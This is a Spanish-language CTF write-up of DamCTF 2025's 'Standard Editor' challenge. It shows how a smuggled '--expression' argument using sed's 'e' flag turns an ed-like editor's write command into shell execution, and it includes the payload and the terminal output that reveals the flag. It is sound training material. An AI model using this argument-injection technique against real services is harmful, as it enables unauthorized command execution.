---
title: "[Misc] Standard Editor - DamCTF 2025"
category: "misc"
subcategory: "rce"
type: "writeup"
tags: ["command-injection", "misc", "standard", "editor", "rce", "damctf", "damctf-2025", "2025", "ctf-writeup"]
summary: "Standard Editor - DAMCTF2025"
source:
  name: "CTFtime writeup #40237"
  url: "https://ctftime.org/writeup/40237"
original_source: "https://k3sero.github.io/posts/Standard-Editor-Damctf2025/"
ctf:
  name: "DamCTF 2025"
  year: 2025
  challenge: "[Misc] Standard Editor"
---

## Metadata

- **CTF:** DamCTF 2025
- **Task:** [Misc] Standard Editor
- **Author team:** Caliphal Hounds
- **CTFtime:** <https://ctftime.org/writeup/40237>
- **Original writeup:** <https://k3sero.github.io/posts/Standard-Editor-Damctf2025/>

---
Standard Editor - DAMCTF2025 __

Contenido __

Standard Editor - DAMCTF2025

__

Autor del reto: `evan`

Dificultad: Media

## Enunciado __

“Joel Fagliano has nothing on me. (flag is all caps)”

##  Archivos __

En este reto, tenemos el siguiente archivo.

  * `conexión por netcat`: Contiene la conexión directa con el servidor del reto.


Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/Damctf2025/Misc/Standard-Editor).

## Analizando el reto __

Al conectarnos por netcat podemos ver el siguiente mensaje.

____

`

```
    1
    2
    3
    4
    5
    6
    7
    8
    9
    10
    11
    12
    13
    14
    15
```

| 

```
        ┌──(kesero㉿kali)-[~]
        └─$ nc standard-editor.chals.damctf.xyz 6733
    
        [Sun May 11 20:22:15 UTC 2025] Welcome, editor!
        Feel free to write in this temporary scratch space.
        All data will be deleted when you're done, but files will
        first be printed to stdout in case you want to keep them.
        
        a
        ?
        b
        ?
        c
        ?
```  
  
---|---  
`

## Solver __

En este reto tendremos que realizar un command injection a través del editor simulado que nos dan en el reto. Para ello como siempre en estos casos, tendremos que probar, probar y probar todo lo posible para observar cómo se comporta el servidor.

La primera suposición que podemos realizar es que el editor mencionado se trata de un editor de línea de comandos personalizado, emulando algo parecido al programa `ed`.

Por ejemplo, si queremos añadir líneas en este tipo de editores, con el comando `a` significa `append` y podemos añadir líneas al editor. Además si queremos finalizar la entrada de líneas, lo realizaremos mediante `.`. De forma parecida, el comando `w` el cual nos permite ejecutar comandos.

Además, al probar, observamos que las expresiones regulares están permitidas ya que observaremos que estamos habilitados para evaluar expresiones de sustitución.

Después de muchos intentos damos con el código para leer la flag.

____

`

```
    1
    2
    3
    4
    5
    6
    7
    8
```

| 

```
    a
    .
    w --expression=s@.*@cd\ ..\;\ cd\ ..\;\ cat\ flag@e
    a
    bruh
    .
    w f
    q
```  
  
---|---  
`

Vamos a explicarlo línea por línea.

  1. `a` empezamos a añadir líneas.
  2. `.` finalizamos la entrada de líneas
  3. `w --expression=s@.*@cd\ ..\;\ cd\ ..\;\ cat\ flag@e`. Para comenzar, `w` permite escribir, `--expression=` nos permite evaluar y ejecuar a continuación. Por otro lado dentro de la expresión tenemos `s@.*@cd\ ..\;\ cd\ ..\;\ cat\ flag@e`. En la cual `s@.*@...@e` es una expresión de sustitución de `sed` con la flag `e`, que ejecuta el resultado como un comando de sistema. Posteriormente, `.*` fuerza a capturar cualquier línea dentro del archivo. Acto seguido se sustituye por `cd ..; cd ..; cat flag` que cambia dos niveles arriba en el sistema de archivos y luego ejecuta `cat flag`

  4. `a, bruh, .` Con esta combinación forzamos a que se ejecute el procesamiento de la expresión anterior.

  5. `w f` Finalmente grabamos el contenido con `f` y guardamos el contenido. De esta manera, forzamos al sistema que interprete la expresión con ejecución.

  6. `q` Por último, salimos del programa.


Realizando los pasos anteriores, obtenemos la flag.

____

`

```
    1
    2
    3
    4
    5
    6
    7
    8
    9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
```

| 

```
      ┌──(kesero㉿kali)-[~]
      └─$ nc standard-editor.chals.damctf.xyz 6733
    
      [Mon May 12 16:19:16 UTC 2025] Welcome, editor!
      Feel free to write in this temporary scratch space.
      All data will be deleted when you're done, but files will
      first be printed to stdout in case you want to keep them.
      a
      .
      w --expression=s@.*@cd\ ..\;\ 
      cd\ ..\;\ cat\ flag@e
      0
      a
      bruh
      .
      w f
      5
      q
      sed: can't read s@vi\|vim\|emacs\|nano\|vscode\|notepad[+][+]\|code\|zed\|atom\|word\|office\|docs\|o365\|copilot\|cursor@ed(1)@ig: No such file or directory
      dam{is_it_w31rd_that_i_u53_ed(1)_4_fun?}
```  
  
---|---  
`

## Flag __

`dam{is_it_w31rd_that_i_u53_ed(1)_4_fun?}`

__[Writeups Competiciones Internacionales](https://k3sero.github.io/categories/writeups-competiciones-internacionales/), [Miscelánea](https://k3sero.github.io/categories/miscel%C3%A1nea/)

__[Misc](https://k3sero.github.io/tags/misc/) [Otros - Writeups](https://k3sero.github.io/tags/otros-writeups/) [Dificultad - Media](https://k3sero.github.io/tags/dificultad-media/) [Misc - Jail](https://k3sero.github.io/tags/misc-jail/) [DAMCTF](https://k3sero.github.io/tags/damctf/)

Esta entrada está licenciada bajo [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) por el autor.

Compartir [ __](https://twitter.com/intent/tweet?text=Standard%20Editor%20-%20DAMCTF2025%20-%20Kesero&url=https%3A%2F%2Fk3sero.github.io%2Fposts%2FStandard-Editor-Damctf2025%2F "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?title=Standard%20Editor%20-%20DAMCTF2025%20-%20Kesero&u=https%3A%2F%2Fk3sero.github.io%2Fposts%2FStandard-Editor-Damctf2025%2F "Facebook") [ __](https://t.me/share/url?url=https%3A%2F%2Fk3sero.github.io%2Fposts%2FStandard-Editor-Damctf2025%2F&text=Standard%20Editor%20-%20DAMCTF2025%20-%20Kesero "Telegram") __
